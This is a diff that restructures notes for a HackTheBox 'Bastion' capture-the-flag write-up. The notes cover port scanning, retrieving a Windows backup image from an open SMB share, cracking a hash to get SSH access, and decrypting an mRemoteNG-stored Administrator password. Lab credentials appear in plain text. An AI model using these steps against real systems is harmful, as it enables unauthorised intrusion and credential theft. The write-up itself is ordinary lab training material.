@@ -1,13 +1,15 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Bastion
-# 17/4/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.134
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT    STATE SERVICE      VERSION
 22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
 135/tcp open  msrpc        Microsoft Windows RPC
@@ -15,9 +17,7 @@ PORT    STATE SERVICE      VERSION
 445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
 
 
-----------------------------------------------------
-# enum
-----------------------------------------------------
+## Enumeration
 └─$ smbclient -L //10.10.10.134     
         Sharename       Type      Comment
         ---------       ----      -------
@@ -33,14 +33,10 @@ smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
   9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
 The hash is cracked as bureaulampje.
 
-----------------------------------------------------
-# foothold
-----------------------------------------------------
+## Exploitation
 Using the credentials l4mpje / bureaulampje we can now login via SSH.
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 cd C:\Progra~2
 dir
 cd mRemoteNG
@@ -61,8 +57,6 @@ aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA1
 decrypt it 
 
 We obtain the password as thXLHM96BeKL0ER2. We can now SSH in as the Administrator.
-
-
 
 
 method to decrypt
